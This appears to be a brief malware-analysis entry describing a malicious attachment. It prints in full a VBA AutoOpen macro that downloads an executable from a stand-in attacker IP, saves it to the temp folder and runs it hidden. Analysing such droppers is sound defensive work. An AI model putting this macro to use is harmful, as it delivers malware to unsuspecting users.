attachment_analysis.embedded_macro:
AutoOpen macro executing VBA code to download and execute a remote payload from attacker-controlled server:
Sub AutoOpen()
  Dim x As Object
  Set x = CreateObject("MSXML2.XMLHTTP")
  x.Open "GET", "http://203.0.113.45/malware.exe", False
  x.Send
  If x.Status = 200 Then
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write x.responseBody
    stream.SaveToFile Environ("TEMP") & "\payload.exe", 2
    stream.Close
    Shell Environ("TEMP") & "\payload.exe", vbHide
  End If
End Sub
